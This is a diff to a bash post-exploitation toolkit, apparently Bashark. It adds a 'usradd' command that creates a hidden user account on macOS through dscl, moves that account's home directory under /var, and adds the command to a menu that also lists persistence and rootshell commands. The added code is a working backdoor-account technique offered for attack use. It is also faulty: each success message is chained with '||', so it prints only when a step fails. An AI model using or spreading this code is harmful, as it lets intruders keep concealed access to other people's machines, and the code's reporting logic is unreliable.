@@ -44,6 +44,13 @@ print_info(){
 PS1="${bold}bashark_$version${reset}$ "
 export PS1
 
+if [ "$(uname)" == "Darwin" ]; then
+    platform="osx"
+elif [ "$(uname)" == "Linux" ]; then 
+    platform="linux"
+fi  
+
+
 #################COMMANDS###################    
 usrs(){
     if [[ "$@" =~ .*-h.* ]]; then
@@ -676,6 +683,8 @@ fileinfo(){
     fi
 }
 
+
+
 ###Commands that require root
 portblock(){
     if [[ "$@" =~ .*-h.* ]]; then 
@@ -762,6 +771,33 @@ rootshell(){
     fi
 }
 
+usradd(){ 
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            useradd [-h] USERNAME
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            USERNAME    Name of the new user
+        ${underline}DESCRIPTION:${reset}
+            Create a new hidden root user on host (currently OSX only)"
+    else
+        if [ $# -eq 0 ]; then
+            print_error "Specify the username"
+        else
+            user=$1
+            if [ $platform == "osx" ]; then
+                dscl . -create /Users/$user PrimaryGroupID 80 || print_good "Created root user"
+                sudo dscl . create /Users/$user IsHidden 1 || print_good "Succesfully hid user"
+                sudo mv /Users/$user /var/$user || print_good "Moved $user home directory under /var"
+                sudo dscl . -create /Users/$user NFSHomeDirectory /var/$user || print_good "Succesfully updated new home directory"
+                sudo dscl . -delete "/SharePoints/$user's Public Folder" || print_good "Deleted $user original home directory"
+            else
+                print_error "Platform is not supported"
+            fi    
+        fi
+    fi
+}
+
 ##Help command
 help(){
         echo "
@@ -795,6 +831,7 @@ Bashark ver. 1.0 Commands:
         ${bold}portblock${reset}${red}    -> ${reset}Block all opened ports except whitelisted
         ${bold}persist${reset}${red}      -> ${reset}Set a command to be executed after every boot
         ${bold}rootshell${reset}${red}    -> ${reset}Create a rootshell
+        ${bold}usradd${reset}${red}       -> ${reset}Create a new hidden user (OSX only)
 
         To show additional information about specific command, type '<command> -h'
         "
